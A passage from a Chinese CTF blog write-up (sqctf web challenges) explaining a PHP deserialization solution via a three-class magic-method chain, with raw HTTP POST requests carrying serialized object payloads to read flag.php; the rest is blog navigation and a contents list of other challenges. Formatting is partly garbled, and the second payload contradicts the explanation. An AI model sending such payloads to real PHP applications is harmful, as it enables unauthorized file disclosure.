+<li><strong>文件存在检测</strong>：<code>file_exists($this-&gt;file)</code> 在 <code>hhh::__destruct()</code> 中触发，但此处通过魔术方法链已绕过</li>
+</ul>
+<ol start="3">
+<li>精确条件满足</li>
+</ol>
+<ul>
+<li><pre><code>content
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">属性直接设置为</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+&quot;GET_FLAG&quot;
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">，触发核心逻辑：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+if ($data-&gt;content === &quot;GET_FLAG&quot;) &#123;
+    echo &quot;Flag: &quot; . file_get_contents(&quot;flag.php&quot;); // 直接输出flag
+&#125;
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line">#### 攻击流程</span><br><span class="line"></span><br><span class="line">1. **发送Payload**：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+ POST / HTTP/1.1
+ Host: challenge.qsnctf.com:30308
+ Content-Type: application/x-www-form-urlencoded
+ 
+ data=O:3:&quot;hhh&quot;:2:&#123;s:4:&quot;file&quot;;O:3:&quot;xxx&quot;:1:&#123;s:4:&quot;data&quot;;O:3:&quot;yyy&quot;:2:&#123;s:4:&quot;path&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;allowed&quot;;b:1;&#125;&#125;s:7:&quot;content&quot;;s:8:&quot;GET_FLAG&quot;;&#125;
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">直接发送以下数据（URL编码后）：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+ POST /target.php HTTP/1.1
+ Host: example.com
+ Content-Type: application/x-www-form-urlencoded
+ 
+ data=O%3A8%3A%22stdClass%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A9%3A%22any_value%22%3Bs%3A7%3A%22content%22%3Bs%3A8%3A%22GET_FLAG%22%3B%7D
+</code></pre>
+<hr>
+</li>
+</ul>
+<ol start="2">
+<li><p><strong>服务端执行流程</strong>：</p>
+<ul>
+<li>反序列化触发 <code>hhh</code> 对象构造</li>
+<li>检查 <code>md5($data-&gt;file)</code> 时触发魔术方法链，实际计算 <code>flag.php</code> 内容的MD5</li>
+<li>满足所有过滤条件后，执行 <code>file_get_contents(&quot;flag.php&quot;)</code> 输出flag</li>
+</ul>
+</li>
+</ol>
+<p><strong>关键验证点</strong></p>
+<ol>
+<li><strong>为什么不能直接用 <code>stdClass</code></strong>？<ul>
+<li><code>stdClass</code> 无法触发魔术方法链，<code>file</code> 属性只能是静态字符串</li>
+<li>若设置 <code>file = &quot;flag.php&quot;</code> 会触发MD5过滤；设置其他值则无法读取flag</li>
+</ul>
+</li>
+<li><strong>为什么需要三层类嵌套</strong>？<ul>
+<li><code>hhh</code> 提供反序列化入口</li>
+<li><code>xxx</code> 桥接 <code>__toString()</code> 调用</li>
+<li><code>yyy</code> 实现最终文件读取操作</li>
+</ul>
+</li>
+</ol>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img1.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img1.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">FLYFISH</div><div class="post-copyright__author_desc">love and be loved</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://flyfish567.github.io/article/%E5%AD%A6%E4%B9%A0study/WP/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://flyfish567.github.io/article/%E5%AD%A6%E4%B9%A0study/WP/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/')">sqctf-web  商丘师范学院第四届网络安全及信息对抗大赛</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img1c786423c6fa1d079ed90fd1b63b592.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img1c786423c6fa1d079ed90fd1b63b592.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img39a034a7638e67c31e4ac65e322d028.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img39a034a7638e67c31e4ac65e322d028.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://flyfish567.github.io/article/%E5%AD%A6%E4%B9%A0study/WP/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=sqctf-web  商丘师范学院第四届网络安全及信息对抗大赛&amp;url=https://flyfish567.github.io/article/%E5%AD%A6%E4%B9%A0study/WP/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/&amp;pic=https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img373f68957c1a6b90f5f394cf59c2dfed395143382.jpg?_r_=9d49968b-f17c-2e1f-2bc2-9968c0b4b0e4" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://flyfish567.github.io" target="_blank">FLYFISHING</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/WP/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>WP<span class="tagsPageCount">2</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img683ddc3754e6a5fcd482d89047dcf37c395143382.jpg?_r_=2e289b28-59e8-cdca-5780-4f073673603e" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/article/%E5%AD%A6%E4%B9%A0study/WP/%5BNSSround#28%20Team%20%5DWeb%20WP%20/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img683ddc3754e6a5fcd482d89047dcf37c395143382.jpg?_r_=a0930edd-1c64-16d9-a8d3-59153ec64911" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info"></div></div></a></div><div class="next-post pull-right"><a href="/article/hello-world/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img00eb9d9de849c996d4cdb440fb732bdb395143382.jpg@1192w.webp?_r_=045ed790-4261-f055-fba5-35d9f519cf6f" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Hello World</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/article/%E5%AD%A6%E4%B9%A0study/WP/%5BNSSround#28%20Team%20%5DWeb%20WP%20/" title=""><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img683ddc3754e6a5fcd482d89047dcf37c395143382.jpg?_r_=a0930edd-1c64-16d9-a8d3-59153ec64911" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-04-01</div><div class="title"></div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description">欢迎喵！</div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">FLYFISH</h1><div class="author-info__desc">love and be loved</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/FLYFISH567" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/351361938" target="_blank" title="BiliBili"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#RceMe%EF%BC%88%E6%9C%AA%E5%AE%8C%E6%88%90%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">RceMe（未完成）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezGame"><span class="toc-number">2.</span> <span class="toc-text">ezGame</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">2.0.1.</span> <span class="toc-text">思路:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E8%A3%85%EF%BC%88%E6%9C%AA%E4%BF%AE%E6%94%B9%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">伪装（未修改）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ping%EF%BC%88%E6%9C%AA%E5%AE%8C%E6%88%90%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">Ping（未完成）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Are-you-from-SQNU-%EF%BC%88%E6%9C%AA%E5%AE%8C%E6%88%90%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">Are you from SQNU?（未完成）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Through"><span class="toc-number">6.</span> <span class="toc-text">Through</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Look-for-the-homepage"><span class="toc-number">7.</span> <span class="toc-text">Look for the homepage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%95%86%E5%B8%88%E4%B8%80%E6%97%A5%E6%B8%B8"><span class="toc-number">8.</span> <span class="toc-text">商师一日游</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3"><span class="toc-number">8.1.</span> <span class="toc-text">第一关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3"><span class="toc-number">8.2.</span> <span class="toc-text">第二关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%85%B3"><span class="toc-number">8.3.</span> <span class="toc-text">第三关</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8curl-V%EF%BC%9F"><span class="toc-number">8.3.1.</span> <span class="toc-text">为什么用curl -V？</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%85%B3"><span class="toc-number">8.4.</span> <span class="toc-text">第四关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E5%85%B3"><span class="toc-number">8.5.</span> <span class="toc-text">第五关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E5%85%B3"><span class="toc-number">8.6.</span> <span class="toc-text">第六关</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E5%B0%8F%E6%9F%A5%E8%AF%A2%E7%B3%BB%E7%BB%9F"><span class="toc-number">9.</span> <span class="toc-text">小小查询系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-include"><span class="toc-number">10.</span> <span class="toc-text">baby_include</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">10.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="toc-number">10.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%8E%9F%E7%90%86"><span class="toc-number">10.3.</span> <span class="toc-text">绕过原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%A1%88"><span class="toc-number">10.4.</span> <span class="toc-text">绕过方案</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#input-a-number"><span class="toc-number">11.</span> <span class="toc-text">input a number</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-number">11.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">11.2.</span> <span class="toc-text">绕过方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ez-calculate"><span class="toc-number">12.</span> <span class="toc-text">Ez_calculate</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-2"><span class="toc-number">12.1.</span> <span class="toc-text">思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#My-Blog"><span class="toc-number">13.</span> <span class="toc-text">My Blog</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%8E%E5%91%80%E5%A4%A7%E5%A4%A7%E5%A4%A7%E9%BB%91%E5%A1%94"><span class="toc-number">14.</span> <span class="toc-text">哎呀大大大黑塔</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">14.1.</span> <span class="toc-text">思路：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%EF%BC%9A"><span class="toc-number">14.2.</span> <span class="toc-text">解法：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%94%AF%E4%B8%80"><span class="toc-number">15.</span> <span class="toc-text">唯一</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-3"><span class="toc-number">15.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%EF%BC%9A-1"><span class="toc-number">15.2.</span> <span class="toc-text">解法：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Upload-Level1"><span class="toc-number">16.</span> <span class="toc-text">Upload_Level1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Upload-Level2"><span class="toc-number">17.</span> <span class="toc-text">Upload_Level2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-rce"><span class="toc-number">18.</span> <span class="toc-text">baby rce</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-4"><span class="toc-number">18.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD"><span class="toc-number">18.2.</span> <span class="toc-text">函数基本功能</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E5%88%86%E6%9E%90"><span class="toc-number">18.2.1.</span> <span class="toc-text">代码示例分析</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%EF%BC%9A-2"><span class="toc-number">18.3.</span> <span class="toc-text">解法：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E6%9C%88%E5%85%89"><span class="toc-number">19.</span> <span class="toc-text">白月光</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E4%B9%8B%E8%88%9E%EF%BC%88%E6%B2%A1%E5%86%99%E5%87%BA%E6%9D%A5%EF%BC%89"><span class="toc-number">20.</span> <span class="toc-text">无参之舞（没写出来）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eeaassyy"><span class="toc-number">21.</span> <span class="toc-text">eeaassyy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%EF%BC%9A-1"><span class="toc-number">21.0.1.</span> <span class="toc-text">思路：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%83"><span class="toc-number">22.</span> <span class="toc-text">逃</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="toc-number">22.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%A1%88-1"><span class="toc-number">22.2.</span> <span class="toc-text">绕过方案</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%98%BF%E5%98%BF%E5%98%BF"><span class="toc-number">23.</span> <span class="toc-text">嘿嘿嘿</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3"><span class="toc-number">23.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%93%BE%E6%9E%84%E9%80%A0"><span class="toc-number">23.2.</span> <span class="toc-text">攻击链构造</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%8E%9F%E7%90%86-1"><span class="toc-number">23.3.</span> <span class="toc-text">绕过原理</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/article/%E5%A4%A7%E5%AD%A6/%E5%A4%A7%E5%AD%A6/" title="hello"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img683ddc3754e6a5fcd482d89047dcf37c395143382.jpg?_r_=2e289b28-59e8-cdca-5780-4f073673603e" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hello"/></a><div class="content"><a class="title" href="/article/%E5%A4%A7%E5%AD%A6/%E5%A4%A7%E5%AD%A6/" title="hello">hello</a><time datetime="2025-06-19T02:11:13.094Z" title="发表于 2025-06-19 10:11:13">2025-06-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/article/%E7%94%9F%E6%B4%BB/%E7%94%9F%E6%B4%BB/" title="hello"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250225164409.bmp?_r_=12f382bf-9a32-fe89-28d5-47d0e06aeed1" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hello"/></a><div class="content"><a class="title" href="/article/%E7%94%9F%E6%B4%BB/%E7%94%9F%E6%B4%BB/" title="hello">hello</a><time datetime="2025-06-19T02:11:10.256Z" title="发表于 2025-06-19 10:11:10">2025-06-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/article/%E5%AD%A6%E4%B9%A0study/%E5%AD%A6%E4%B9%A0/" title="hello"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250225164222.bmp?_r_=60d56d1b-2607-90ea-cd07-67f0bf708fe1" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hello"/></a><div class="content"><a class="title" href="/article/%E5%AD%A6%E4%B9%A0study/%E5%AD%A6%E4%B9%A0/" title="hello">hello</a><time datetime="2025-05-24T05:18:21.457Z" title="发表于 2025-05-24 13:18:21">2025-05-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/article/hello-world/" title="Hello World"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img00eb9d9de849c996d4cdb440fb732bdb395143382.jpg@1192w.webp?_r_=045ed790-4261-f055-fba5-35d9f519cf6f" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/article/hello-world/" title="Hello World">Hello World</a><time datetime="2025-05-23T11:13:47.675Z" title="发表于 2025-05-23 19:13:47">2025-05-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/article/%E5%AD%A6%E4%B9%A0study/WP/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/" title="sqctf-web  商丘师范学院第四届网络安全及信息对抗大赛"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img373f68957c1a6b90f5f394cf59c2dfed395143382.jpg?_r_=9d49968b-f17c-2e1f-2bc2-9968c0b4b0e4" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sqctf-web  商丘师范学院第四届网络安全及信息对抗大赛"/></a><div class="content"><a class="title" href="/article/%E5%AD%A6%E4%B9%A0study/WP/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/" title="sqctf-web  商丘师范学院第四届网络安全及信息对抗大赛">sqctf-web  商丘师范学院第四届网络安全及信息对抗大赛</a><time datetime="2025-04-07T07:07:04.548Z" title="发表于 2025-04-07 15:07:04">2025-04-07</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2025 - 2026 By <a class="footer-bar-link" href="/" title="FLYFISH" target="_blank">FLYFISH</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div 